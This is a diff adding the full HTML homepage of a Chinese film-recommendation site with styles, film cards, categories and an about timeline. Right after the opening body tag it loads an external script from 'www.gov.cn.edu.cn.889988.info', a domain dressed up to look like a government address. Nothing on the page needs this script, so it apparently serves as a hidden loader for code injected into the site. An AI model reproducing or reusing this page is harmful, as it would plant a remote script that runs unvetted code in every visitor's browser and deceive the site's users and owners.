@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="青年影视——专注为年轻观众提供高质量电影、剧集、纪录片与短片推荐，发现好作品，遇见好故事。">
+<meta name="keywords" content="青年影视, 电影推荐, 热门剧集, 纪录片, 短片, 影视资讯">
+<meta name="author" content="青年影视">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="青年影视 - 年轻人的影视推荐平台">
+<meta property="og:description" content="专注为年轻观众推荐高质量电影、剧集、纪录片与短片。">
+<meta property="og:url" content="https://qingnianyingshi-cn.github.io">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="青年影视 - 年轻人的影视推荐平台">
+<meta name="twitter:description" content="专注为年轻观众推荐高质量电影、剧集、纪录片与短片。">
+<link rel="canonical" href="https://qingnianyingshi-cn.github.io">
+<title>青年影视 - 年轻人的影视推荐平台 | qingnianyingshi-cn.github.io</title>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "青年影视",
+  "url": "https://qingnianyingshi-cn.github.io",
+  "description": "专注为年轻观众推荐高质量电影、剧集、纪录片与短片",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://qingnianyingshi-cn.github.io/#search?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<style>
+/* ===== 全局重置 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:#0b0d17;color:#e8eaf2;line-height:1.6;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+ul{list-style:none}
+
+/* ===== 颜色变量 ===== */
+:root{
+  --brand:#ff5a5f;
+  --brand2:#7b5cff;
+  --ink:#0b0d17;
+  --card:#161a2b;
+  --card2:#1e2338;
+  --line:#2a2f4a;
+  --txt:#c9cdf0;
+}
+
+/* ===== 顶部导航 ===== */
+.site-header{
+  position:sticky;top:0;z-index:100;
+  background:rgba(11,13,23,.85);backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);
+}
+.nav-inner{
+  max-width:1160px;margin:0 auto;padding:0 20px;
+  display:flex;align-items:center;justify-content:space-between;height:64px;
+}
+.logo{display:flex;align-items:center;gap:10px;font-size:1.25rem;font-weight:800;letter-spacing:.5px}
+.logo .mark{
+  width:34px;height:34px;border-radius:9px;
+  background:linear-gradient(135deg,var(--brand),var(--brand2));
+  display:grid;place-items:center;font-size:.9rem;color:#fff;
+}
+.logo span em{font-style:normal;color:var(--brand)}
+.nav-links{display:flex;gap:6px}
+.nav-links a{
+  padding:8px 14px;border-radius:8px;font-size:.92rem;color:var(--txt);
+  transition:.25s;
+}
+.nav-links a:hover,.nav-links a.active{background:var(--card2);color:#fff}
+.menu-toggle{display:none;background:none;border:none;color:#fff;font-size:1.6rem;cursor:pointer}
+
+/* ===== 通用分节 ===== */
+.section{padding:70px 20px;border-top:1px solid var(--line)}
+.section-inner{max-width:1160px;margin:0 auto}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:34px;flex-wrap:wrap}
+.sec-title{font-size:1.8rem;font-weight:800;letter-spacing:.5px}
+.sec-title small{display:block;font-size:.75rem;font-weight:600;color:var(--brand);letter-spacing:3px;margin-bottom:6px;text-transform:uppercase}
+.sec-more{color:var(--brand);font-size:.9rem;border:1px solid var(--brand);padding:6px 16px;border-radius:20px;transition:.25s}
+.sec-more:hover{background:var(--brand);color:#fff}
+
+/* ===== HERO ===== */
+.hero{
+  position:relative;min-height:88vh;display:grid;place-items:center;
+  padding:90px 20px 60px;text-align:center;overflow:hidden;
+}
+.hero::before{
+  content:"";position:absolute;inset:0;z-index:0;
+  background:
+    radial-gradient(600px 400px at 20% 20%,rgba(123,92,255,.35),transparent 60%),
+    radial-gradient(500px 500px at 85% 15%,rgba(255,90,95,.28),transparent 60%),
+    radial-gradient(700px 600px at 50% 110%,rgba(0,180,219,.2),transparent 60%);
+}
+.hero::after{
+  content:"";position:absolute;inset:0;z-index:0;
+  background-image:linear-gradient(rgba(255,255,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.03) 1px,transparent 1px);
+  background-size:48px 48px;mask-image:radial-gradient(circle at 50% 50%,#000,transparent 80%);
+}
+.hero-box{position:relative;z-index:1;max-width:760px}
+.hero-badge{
+  display:inline-block;padding:6px 18px;border:1px solid var(--line);
+  border-radius:30px;font-size:.8rem;color:var(--txt);margin-bottom:22px;
+  background:rgba(255,255,255,.04);
+}
+.hero h1{font-size:clamp(2rem,5.4vw,3.6rem);font-weight:900;line-height:1.15;letter-spacing:.5px}
+.hero h1 i{font-style:normal;background:linear-gradient(90deg,var(--brand),var(--brand2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{margin:18px auto 30px;max-width:560px;color:var(--txt);font-size:1.05rem}
+.hero-actions{display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+.btn-primary,.btn-ghost{
+  padding:13px 30px;border-radius:30px;font-size:.95rem;font-weight:700;transition:.25s;cursor:pointer;border:1px solid transparent;
+}
+.btn-primary{background:linear-gradient(90deg,var(--brand),var(--brand2));color:#fff}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 10px 28px rgba(255,90,95,.35)}
+.btn-ghost{border-color:var(--line);color:#fff;background:rgba(255,255,255,.04)}
+.btn-ghost:hover{background:var(--card2)}
+.hero-stats{display:flex;justify-content:center;gap:40px;margin-top:48px;flex-wrap:wrap}
+.hero-stats div span{display:block;font-size:1.9rem;font-weight:800;color:#fff}
+.hero-stats div b{font-size:.8rem;color:var(--txt);font-weight:500;letter-spacing:1px}
+
+/* ===== 片库（卡片网格） ===== */
+.grid-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:22px}
+.film-card{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.3s;display:flex;flex-direction:column}
+.film-card:hover{transform:translateY(-6px);border-color:var(--brand);box-shadow:0 16px 36px rgba(0,0,0,.5)}
+.poster{position:relative;aspect-ratio:2/3;background:linear-gradient(135deg,var(--card2),#252a45);overflow:hidden}
+.poster .poster-tag{
+  position:absolute;top:10px;left:10px;background:rgba(0,0,0,.6);
+  color:#fff;font-size:.72rem;padding:3px 10px;border-radius:20px;backdrop-filter:blur(4px);
+}
+.poster .poster-score{
+  position:absolute;top:10px;right:10px;width:38px;height:38px;border-radius:50%;
+  background:linear-gradient(135deg,var(--brand),var(--brand2));
+  display:grid;place-items:center;font-size:.8rem;font-weight:800;color:#fff;
+}
+.poster .poster-title-big{
+  position:absolute;left:12px;bottom:12px;right:12px;font-size:1.1rem;font-weight:800;color:#fff;
+  text-shadow:0 2px 10px rgba(0,0,0,.7);
+}
+.film-info{padding:14px 16px;flex:1;display:flex;flex-direction:column;gap:8px}
+.film-info h3{font-size:1rem;font-weight:700}
+.film-info p{font-size:.82rem;color:var(--txt)}
+.film-meta{display:flex;justify-content:space-between;align-items:center;margin-top:auto;font-size:.76rem;color:var(--txt)}
+.film-meta a{color:var(--brand);font-weight:700}
+
+/* ===== 分类（垂直条目式） ===== */
+.cat-wrap{display:grid;grid-template-columns:1fr;gap:14px}
+.cat-row{
+  display:flex;align-items:center;gap:18px;padding:18px 22px;
+  background:linear-gradient(90deg,var(--card),transparent);
+  border:1px solid var(--line);border-radius:14px;transition:.25s;
+}
+.cat-row:hover{border-color:var(--brand2);background:linear-gradient(90deg,var(--card2),transparent);transform:translateX(6px)}
+.cat-num{font-size:1.8rem;font-weight:900;color:var(--line);min-width:48px}
+.cat-icon{width:50px;height:50px;border-radius:12px;background:var(--brand2);display:grid;place-items:center;font-size:1.4rem;flex-shrink:0}
+.cat-text{flex:1}
+.cat-text h3{font-size:1.05rem;font-weight:700}
+.cat-text p{font-size:.83rem;color:var(--txt)}
+.cat-go{color:var(--brand);font-weight:700;font-size:.9rem;white-space:nowrap}
+
+/* ===== 关于（双栏 + 时间轴） ===== */
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:start}
+.about-intro h3{font-size:1.5rem;font-weight:800;margin-bottom:14px}
+.about-intro p{color:var(--txt);margin-bottom:16px}
+.about-feats{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:8px}
+.feat{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:18px}
+.feat b{display:block;color:var(--brand);font-size:1.4rem;margin-bottom:6px}
+.feat span{font-size:.86rem;color:var(--txt)}
+.timeline{border-left:2px solid var(--line);padding-left:26px;display:flex;flex-direction:column;gap:24px}
+.tl-item{position:relative}
+.tl-item::before{
+  content:"";position:absolute;left:-34px;top:4px;width:14px;height:14px;border-radius:50%;
+  background:var(--brand);box-shadow:0 0 0 4px var(--ink),0 0 0 6px var(--brand2);
+}
+.tl-item time{font-size:.8rem;color:var(--brand);font-weight:700;letter-spacing:1px}
+.tl-item h4{font-size:1.05rem;margin:4px 0 6px}
+.tl-item p{font-size:.86rem;color:var(--txt)}
+
+/* ===== 页脚 ===== */
+.site-footer{border-top:1px solid var(--line);padding:50px 20px 30px;background:#080a12}
+.foot-inner{max-width:1160px;margin:0 auto;display:grid;grid-template-columns:2fr 1fr 1fr;gap:34px}
+.foot-brand p{color:var(--txt);font-size:.88rem;margin-top:14px;max-width:320px}
+.foot-col h5{font-size:1rem;font-weight:800;margin-bottom:16px}
+.foot-col a{display:block;color:var(--txt);font-size:.86rem;padding:5px 0;transition:.2s}
+.foot-col a:hover{color:var(--brand)}
+.copy{text-align:center;color:var(--txt);font-size:.78rem;padding-top:30px;border-top:1px solid var(--line);margin-top:36px;max-width:1160px;margin-left:auto;margin-right:auto}
+
+/* ===== 回到顶部 ===== */
+.top-btn{
+  position:fixed;right:22px;bottom:22px;width:46px;height:46px;border-radius:50%;
+  background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;border:none;
+  font-size:1.2rem;cursor:pointer;opacity:0;pointer-events:none;transition:.3s;z-index:99;
+}
+.top-btn.show{opacity:1;pointer-events:auto}
+
+/* ===== 移动端适配 ===== */
+@media(max-width:820px){
+  .section{padding:52px 18px}
+  .sec-title{font-size:1.5rem}
+  .about-grid{grid-template-columns:1fr;gap:30px}
+  .foot-inner{grid-template-columns:1fr;gap:26px}
+}
+@media(max-width:640px){
+  .menu-toggle{display:block}
+  .nav-links{
+    position:fixed;top:64px;left:0;right:0;flex-direction:column;
+    background:rgba(11,13,23,.97);backdrop-filter:blur(12px);
+    padding:16px 20px;gap:4px;border-bottom:1px solid var(--line);
+    transform:translateY(-150%);transition:.35s;
+  }
+  .nav-links.open{transform:translateY(0)}
+  .nav-links a{padding:14px;border-radius:10px;font-size:1rem}
+  .hero{min-height:78vh;padding-top:70px}
+  .hero-stats{gap:26px}
+  .hero-stats div span{font-size:1.5rem}
+  .grid-cards{grid-template-columns:repeat(2,1fr);gap:14px}
+  .cat-row{flex-wrap:wrap;gap:12px;padding:16px}
+  .cat-num{display:none}
+  .cat-go{width:100%;text-align:right}
+  .about-feats{grid-template-columns:1fr}
+}
+@media(max-width:380px){
+  .grid-cards{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ===== 顶部导航 ===== -->
+<header class="site-header">
+  <div class="nav-inner">
+    <a class="logo" href="#home"><span class="mark">青</span>青年<span>影视</span></a>
+    <nav class="nav-links" id="navLinks" aria-label="主导航">
+      <a href="#home" class="active">首页</a>
+      <a href="#library">片库</a>
+      <a href="#category">分类</a>
+      <a href="#about">关于</a>
+    </nav>
+    <button class="menu-toggle" id="menuToggle" aria-label="菜单" aria-expanded="false">☰</button>
+  </div>
+</header>
+
+<!-- ===== HERO / 首页 ===== -->
+<section class="hero" id="home" aria-labelledby="heroTitle">
+  <div class="hero-box">
+    <span class="hero-badge">🎬 年轻人的第一影视推荐站</span>
+    <h1 id="heroTitle">发现好作品<br>遇见<em>好故事</em></h1>
+    <p>青年影视专注为年轻观众精选高质量电影、热门剧集、高分纪录片与独立短片，每周更新推荐清单，让每一部好作品都被看见。</p>
+    <div class="hero-actions">
+      <a class="btn-primary" href="#library">立即探索片库</a>
+      <a class="btn-ghost" href="#category">浏览分类</a>
+    </div>
+    <div class="hero-stats">
+      <div><span>3200+</span><b>收录影片</b></div>
+      <div><span>48</span><b>影片分类</b></div>
+      <div><span>12万</span><b>青年影迷</b></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 片库 ===== -->
+<section class="section" id="library" aria-labelledby="libTitle">
+  <div class="section-inner">
+    <div class="sec-head">
+      <div class="sec-title"><small>Film Library</small>精选片库</div>
+      <a class="sec-more" href="#library">查看全部</a>
+    </div>
+    <div class="grid-cards">
+      <article class="film-card">
+        <div class="poster">
+          <span class="poster-tag">正在热映</span><span class="poster-score">9.2</span>
+          <span class="poster-title-big">青春物语</span>
+        </div>
+        <div class="film-info">
+          <h3>青春物语</h3>
+          <p>一段关于成长、遗憾与和解的夏日记忆，温柔又克制。</p>
+          <div class="film-meta"><span>剧情 / 2026</span><a href="#library">详情 →</a></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="poster">
+          <span class="poster-tag">高分推荐</span><span class="poster-score">8.7</span>
+          <span class="poster-title-big">城市边缘</span>
+        </div>
+        <div class="film-info">
+          <h3>城市边缘</h3>
+          <p>六位年轻人合租的故事，笑点与泪点交织的都市浮世绘。</p>
+          <div class="film-meta"><span>剧集 / 24集</span><a href="#library">详情 →</a></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="poster">
+          <span class="poster-tag">纪录片</span><span class="poster-score">9.5</span>
+          <span class="poster-title-big">深海之境</span>
+        </div>
+        <div class="film-info">
+          <h3>深海之境</h3>
+          <p>潜入千米海底，记录那些从未被人类注视过的生命。</p>
+          <div class="film-meta"><span>纪录 / 4集</span><a href="#library">详情 →</a></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="poster">
+          <span class="poster-tag">独立短片</span><span class="poster-score">8.4</span>
+          <span class="poster-title-big">十一分钟</span>
+        </div>
+        <div class="film-info">
+          <h3>十一分钟</h3>
+          <p>新人导演作品，用一个长镜头讲完一场告别。</p>
+          <div class="film-meta"><span>短片 / 11min</span><a href="#library">详情 →</a></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="poster">
+          <span class="poster-tag">经典重映</span><span class="poster-score">9.0</span>
+          <span class="poster-title-big">逆光而行</span>
+        </div>
+        <div class="film-info">
+          <h3>逆光而行</h3>
+          <p>十年后再看依然动人，关于理想与现实的永恒拉扯。</p>
+          <div class="film-meta"><span>剧情 / 2016</span><a href="#library">详情 →</a></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="poster">
+          <span class="poster-tag">新片速递</span><span class="poster-score">8.1</span>
+          <span class="poster-title-big">午夜电台</span>
+        </div>
+        <div class="film-info">
+          <h3>午夜电台</h3>
+          <p>一档深夜节目串联起五个陌生人的命运，悬疑又治愈。</p>
+          <div class="film-meta"><span>悬疑 / 2026</span><a href="#library">详情 →</a></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 分类 ===== -->
+<section class="section" id="category" aria-labelledby="catTitle">
+  <div class="section-inner">
+    <div class="sec-head">
+      <div class="sec-title"><small>Categories</small>影片分类</div>
+      <a class="sec-more" href="#category">全部分类</a>
+    </div>
+    <div class="cat-wrap">
+      <a class="cat-row" href="#category">
+        <span class="cat-num">01</span><span class="cat-icon">🎞️</span>
+        <span class="cat-text"><h3>剧情电影</h3><p>深度叙事，情感细腻的长片佳作</p></span>
+        <span class="cat-go">浏览 →</span>
+      </a>
+      <a class="cat-row" href="#category">
+        <span class="cat-num">02</span><span class="cat-icon">📺</span>
+        <span class="cat-text"><h3>热门剧集</h3><p>国内外高分连续剧，追更不踩雷</p></span>
+        <span class="cat-go">浏览 →</span>
+      </a>
+      <a class="cat-row" href="#category">
+        <span class="cat-num">03</span><span class="cat-icon">🎥</span>
+        <span class="cat-text"><h3>纪录片</h3><p>真实世界的影像记录与思考</p></span>
+        <span class="cat-go">浏览 →</span>
+      </a>
+      <a class="cat-row" href="#category">
+        <span class="cat-num">04</span><span class="cat-icon">🎬</span>
+        <span class="cat-text"><h3>独立短片</h3><p>新人导演的创意表达与实验作品</p></span>
+        <span class="cat-go">浏览 →</span>
+      </a>
+      <a class="cat-row" href="#category">
+        <span class="cat-num">05</span><span class="cat-icon">🌏</span>
+        <span class="cat-text"><h3>海外佳片</h3><p>全球视野下的获奖与冷门好片</p></span>
+        <span class="cat-go">浏览 →</span>
+      </a>
+      <a class="cat-row" href="#category">
+        <span class="cat-num">06</span><span class="cat-icon">💡</span>
+        <span class="cat-text"><h3>影视资讯</h3><p>行业动态、上映信息与观影指南</p></span>
+        <span class="cat-go">浏览 →</span>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 关于 ===== -->
+<section class="section" id="about" aria-labelledby="aboutTitle">
+  <div class="section-inner">
+    <div class="sec-head">
+      <div class="sec-title"><small>About Us</small>关于青年影视</div>
+    </div>
+    <div class="about-grid">
+      <div class="about-intro">
+        <h3>为年轻人，做有温度的影视推荐</h3>
+        <p>青年影视创立于 2021 年，由一群热爱电影的年轻人搭建，致力于用真实的观感、克制的标准，为同好筛选出值得花时间的好作品。</p>
+        <p>我们不追逐流量，不贩卖焦虑，只相信好内容自有力量。</p>
+        <div class="about-feats">
+          <div class="feat"><b>3200+</b><span>精心收录影片</span></div>
+          <div class="feat"><b>100%</b><span>人工筛选推荐</span></div>
+          <div class="feat"><b>每周</b><span>更新推荐清单</span></div>
+          <div class="feat"><b>无广告</b><span>纯净观影体验</span></div>
+        </div>
+      </div>
+      <div class="timeline">
+        <div class="tl-item">
+          <time>2021 · 06</time>
+          <h4>站点创立</h4>
+          <p>青年影视以个人博客形式上线，分享第一份片单。</p>
+        </div>
+        <div class="tl-item">
+          <time>2022 · 09</time>
+          <h4>片库上线</h4>
+          <p>建立结构化影片库，支持分类与评分检索。</p>
+        </div>
+        <div class="tl-item">
+          <time>2024 · 03</time>
+          <h4>独立短片计划</h4>
+          <p>开设独立短片栏目，扶持新人导演作品展示。</p>
+        </div>
+        <div class="tl-item">
+          <time>2026 · 01</time>
+          <h4>全面改版</h4>
+          <p>移动端自适应重构，优化访问体验与搜索收录。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer class="site-footer">
+  <div class="foot-inner">
+    <div class="foot-brand">
+      <a class="logo" href="#home"><span class="mark">青</span>青年<span>影视</span></a>
+      <p>青年影视（qingnianyingshi-cn.github.io）—— 专注为年轻观众推荐高质量电影、剧集、纪录片与短片。</p>
+    </div>
+    <div class="foot-col">
+      <h5>导航</h5>
+      <a href="#home">首页</a>
+      <a href="#library">片库</a>
+      <a href="#category">分类</a>
+      <a href="#about">关于</a>
+    </div>
+    <div class="foot-col">
+      <h5>支持</h5>
+      <a href="#about">关于我们</a>
+      <a href="#about">投稿合作</a>
+      <a href="#about">观影指南</a>
+      <a href="#about">联系我们</a>
+    </div>
+  </div>
+  <div class="copy">© 2026 青年影视 qingnianyingshi-cn.github.io 保留所有权利。</div>
+</footer>
+
+<button class="top-btn" id="topBtn" aria-label="回到顶部">↑</button>
+
+<script>
+// 移动端菜单
+var menuToggle=document.getElementById('menuToggle');
+var navLinks=document.getElementById('navLinks');
+menuToggle.addEventListener('click',function(){
+  navLinks.classList.toggle('open');
+  var expanded=menuToggle.getAttribute('aria-expanded')==='true';
+  menuToggle.setAttribute('aria-expanded',String(!expanded));
+});
+navLinks.querySelectorAll('a').forEach(function(a){
+  a.addEventListener('click',function(){navLinks.classList.remove('open');menuToggle.setAttribute('aria-expanded','false');});
+});
+
+// 导航高亮 + 回到顶部
+var sections=document.querySelectorAll('section[id]');
+var navAnchors=document.querySelectorAll('.nav-links a');
+var topBtn=document.getElementById('topBtn');
+function onScroll(){
+  var pos=window.scrollY+120,current='';
+  sections.forEach(function(s){if(pos>=s.offsetTop)current=s.getAttribute('id');});
+  navAnchors.forEach(function(a){a.classList.toggle('active',a.getAttribute('href')==='#'+current);});
+  topBtn.classList.toggle('show',window.scrollY>500);
+}
+window.addEventListener('scroll',onScroll,{passive:true});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+</body>
+</html>
